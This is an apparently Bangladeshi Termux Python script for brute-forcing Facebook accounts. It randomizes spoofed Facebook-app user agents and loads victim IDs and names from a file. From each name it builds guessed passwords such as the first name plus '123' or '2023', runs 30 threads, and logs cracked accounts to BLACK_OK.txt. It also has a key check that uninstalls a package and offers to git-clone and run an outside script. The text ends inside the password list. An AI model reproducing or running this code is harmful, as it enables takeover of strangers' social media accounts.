
#-----------------[ IMPORT-MODULE ]-------------------
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()

now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day

#------------------[ USER-AGENT ]-------------------#
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
tan=('https')
iya=('github')
ani=('Fariya')
love=('mbasic')
ugen=[]
ugen=[]
useragent=[]
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-N986N Build/ZK83T5) [FBAN/FB4A;FBAV/979.2.9.20.981;FBPN/com.facebook.katana;FBLC/en_US;FBBV/687217741;FBCR/Glo Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-N986N;FBSV/11;FBCA/x86:armeabi-v7a;FBDM/{density=2.5,width=1080,height=2220};FB_FW/0;FBRV/0;]"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]"}
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; Android 10; Nokia 1 Plus Build/QP1A.190711.020; wv)'
        b=random.choice(['6','7','8','9','10','11','12',])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/319.0.0.7.107;]'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 9; Nokia C2 Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
for agent in range(10000):
        aa='Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='CPU iPhone OS 16_0 like Mac OS X'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile/20A5312g [FBAN/FBIOS;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/cs_CZ;FBOP/5]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)      

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/ta_IN;FBAV/331.0.0.9.105;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)      

def uaku():
	try:
		ua=open('mix.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Niki404-Cyber/user-agnet/blob/main/mix.txt').text
		ua=open('.mix.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n') 
		ua=open('.mix.txt','r').read().splitlines()
#--------------------[ CONVERTER-BULAN ]--------------#
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#------------------[ MACHINE-SUPPORT ]---------------#
def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\x1b[1;91mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"

def _KAUSAR_(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f"""      
 ▄▄▄▄    ██▓    ▄▄▄       ▄████▄   ██ ▄█▀
▓█████▄ ▓██▒   ▒████▄    ▒██▀ ▀█   ██▄█▒ 
▒██▒ ▄██▒██░   ▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
▒██░█▀  ▒██░   ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
░▓█  ▀█▓░██████▒▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
░▒▓███▀▒░ ▒░▓  ░▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
▒░▒   ░ ░ ░ ▒  ░ ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
 ░    ░   ░ ░    ░   ▒   ░        ░ ░░ ░ 
 ░          ░  ░     ░  ░░ ░      ░  ░   
      ░                  ░               
══════════════════════════════════════════""")
os.system('clear')
banner()

def bypass():
  os.system('pip install requests')
  file = open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py", "r")
  data = file.read()
  word = ("print (url)")
  if word in data:
    print('OLD METHOD FIND NEW ONE BRO ')
    time.sleep(2)
    exit()

def chk():
  bypass()
  if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):

        print("\n\033[1;91m[•]BRO STOP YOUR BYPASS SYSTEM TOO. IF YOU TRY AGAIN, THE DATA WILL BE REMOVED .")
        print("\033[1;91m[•]LAST WORNNING ")

        time.sleep(2)
        print("\n\033[1;97m[•]HI ACHUDA TOR BYPASSER FUCK YOU")
        time.sleep(5)
        exit()
        
  os.system('xdg-open https://github.com/DH-Alamin')
  os.system('pip uninstall requests -y')
  os.system('pip install request')
  os.system('clear')
  os.system('xdg-open https://www.facebook.com/DaRk.HuNtEr.aLaMin.01')
  print(logo)
  print('\033[94m[•]\033[97mMY TOOLS ARE FREE')
  print('\033[94m[•]\033[97mYOUR KEY SEND MY INBOX')
  print('\033[94m[•]\033[97mBRO DO NOT TRY BYPASS')
  uuid = str(os.geteuid()) + str(os.getlogin()) 
  id = "|".join(uuid)
  print("\n\n\x1b[37;1m\033[92m[•]\033[97mYOUR KEY 👉 : \033[94m"+id) 
  try: 
    httpCaht = requests.get("https://github.com/DH-Alamin/chil/blob/main/Sata_ok.txt").text 
    if id in httpCaht: 
      print("\033[97m  YOUR KEY ACTIVE. .......\033[97m") 
      msg = str(os.geteuid()) 
      time.sleep(1) 
      pass 
    else:
      
      print('\033[92m[•]\033[97mMY ID : DH ALAMIN HASAN [ DARK-HUNTER ]')
      print('\033[92m[•]\033[97mYOUR KEY SEND MY INBOX')
      os.system('xdg-open https://www.facebook.com/DaRk.HuNtEr.aLaMin.01')
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print (logo)
     chk() 
    
chk()

def Fire_Main():
    os.system("clear")
    banner()
    print(f"\x1b[1;91m[\x1b[1;92mA\x1b[1;91m] \x1b[1;97mFile Cloning")
   # print(f"{oo(2)Pak Random Cloning")
    #print(f"{oo(3)}Gmail Cloning")  
    print(f"\x1b[1;91m[\x1b[1;92mB\x1b[1;91m] \x1b[1;97mCreate File")
    #print(f"{oo(0)}Exit")
    inpp = input(f"('?')Your Choice : ")
    if inpp == "A":
        F()
    #if inpp == '':pak()
    #if inpp =='3':
      #  gmail()
    if inpp == "B":
     print(f'("+")Loading Best File Create Command ')
     os.system('cd && git clone --depth=1 https://github.com/Hannan-404/FILE')
     os.system('cd && cd FILE ;python FILE.py')
     exit()
    if inpp == "0":
     exit('Exit!')
	


#-------------[ CRACK-FROM-FILE ]------------------#
def F():
    os.system('clear');
    D().plerr()
    

class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			print(f' \x1b[1;92m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;34m     Example: /sdcard/ᗰᖇ.ᗷᗩᕼᗩᑌᗪᗪIᑎ.txt     \033[40m\033[00m')
			fileX = input (' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Enter Your File ➣\x1b[1;93m ') 
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;96m TOTAL ID ➣ \x1b[1;92m'+str(len(id)))
			Settings()
		except IOError:
			print(" \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m file %s not found\x1b[0m"%(fileX));time.sleep(2)
			F()
#-------------[ PENGATURAN-IDZ ]---------------#
def Settings():
	print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Only New Id \x1b[1;92m[BEST]\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m New Old Mix')
	hu = input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;94mChoose ➣\x1b[1;92m ')
	if hu in ['1','01']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['2','02']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' \x1b[1;91m\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mWrong Option Bara')
		exit()
	
	print(f' \x1b[1;91m[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m METHOD B-API [BEST]')
	hc = input(' \x1b[1;91m \x1b[1;94mChoose \x1b[1;92m ')
	os.system('clear')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;35m     PASSWORD MENU     \033[40m\033[00m\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Manual Password \x1b[1;91m[m]\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Auto Password \x1b[1;96m[d] \x1b[1;92m[BEST]\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;94mChoice ➣ \x1b[1;92m')
	os.system('clear')
	banner()
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'Add Password Manual Minimam 6 Character')
		pwku=input(' \x1b[1;91m\x1b[1;96m\x1b[1;92mAdd Password Manual : ')
		os.system('clear')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 
#------------[ WARNA-MEMEKMU]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT 
white = '\33[0;37m' #PUTIH
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :hasan = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :hasan = ' ~> 2009'
        elif uid[:8] in ['10000000']        :hasan = ' ~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:hasan = ' ~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:hasan = ' 2010'
        elif uid[:6] in ['100001']          :hasan = ' ~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :hasan = ' ~> 2011/2012'
        elif uid[:6] in ['100004']          :hasan = ' - 2012/2013'
        elif uid[:6] in ['100005','100006'] :hasan = ' ~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :hasan = ' ~> 2014/2015'
        elif uid[:6] in ['100009']          :hasan = ' ~> 2015'
        elif uid[:5] in ['10001']           :hasan = ' ~> 2015/2016'
        elif uid[:5] in ['10002']           :hasan = ' ~> 2016/2017'
        elif uid[:5] in ['10003']           :hasan = ' ~> 2018/2019'
        elif uid[:5] in ['10004']           :hasan = ' ~> 2019/2020'
        elif uid[:5] in ['10005']           :hasan = ' ~> 2020'
        elif uid[:5] in ['10006','10007','']:hasan = ' ~> 2021'
        elif uid[:5] in ['10008']           :hasan = ' ~>2022'
        elif uid[:5] in ['10009']           :hasan = ' ~> 2023'
        else:hasan=''
    elif len(uid) in [9,10]:
        hasan = ' ~> 2008/2009'
    elif len(uid)==8:
        hasan = ' ~> 2007/2008'
    elif len(uid)==7:
        hasan = ' ~> 2006/2007'
    else:hasan=''
    return hasan
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	#print(f'\x1b[1;91m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m❴\033[47m\033[1;30mᗰᖇ.ᗷᗩᕼᗩᑌᗪᗪIᑎ\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m●')
	os.system("clear")
	banner()
	print(f'├──> While Waiting for Results ')
	print(f' Results OK Saved In :BLACK_OK.txt')
	print(f' Results CP Saved In :CP.txt')
	print(f' Play Airplane Mode Any 1k Idz\r')
	print('══════════════════════════════════════════')
	#print(f"\x1b[1;91m [💉] \x1b[1;92m TODAY TIME        \x1b[1;91m➢ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	#print(f"\x1b[1;91m [💉] \x1b[1;92m TODAY DATE        \x1b[1;91m➢ \x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta} ")
	#print(f"\x1b[1;91m [😩] \x1b[1;91m NOTE ➢ \33[1;92m[ USE AIRPLANE MODE BEFORE USE ] ")
	p#rint(f'\x1b[1;91m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m❴\033[47m\033[1;30mᗰᖇ.ᗷᗩᕼᗩᑌᗪᗪIᑎ\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m●\n')
	#os.system("play-audio stard.mp3 ")
	print(50*'_')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append('bangladesh')
					pwv.append('shanto')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@')
					pwv.append(frs+'1122')
					pwv.append(frs+'2023')
					pwv.append('123456')
					pwv.append('@#@#@#')
					pwv.append(frs+'321') 
					pwv.append(frs+'4321')
					pwv.append(frs+'00') 
					pwv.append(frs+'01') 
					pwv.append(frs+'02') 
					pwv.append(frs+'03') 
					pwv.append(frs+'04') 
					pwv.append(frs+'05') 
					pwv.append(frs+'06') 
					pwv.append(frs+'07') 
					pwv.append(frs+'08') 
					pwv.append(frs+'09') 
					pwv.append(frs+'10') 
					pwv.append(frs+'11') 
					pwv.append(frs+'12')
					pwv.append('shanto1122')
					pwv.append('bahauddin')
					pwv.append(nmf+'1122')
					pwv.append(nmf+'@@@')
					pwv.append(nmf+'@')
					pwv.append(nmf+'@@')
					pwv.append(nmf+'@123@')
					pwv.append(nmf+'@1122@')
					pwv.append(nmf+'@1234@')
					pwv.append(nmf+'@#@#@#')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(frs+'2023')
					pwv.append(nmf+'2023')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append('bangladesh')
					pwv.append('shanto')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@')
					pwv.append(frs+'1122')
					pwv.append(frs+'2023')
					pwv.append('123456')
					pwv.append('@#@#@#')
					pwv.append(frs+'321') 
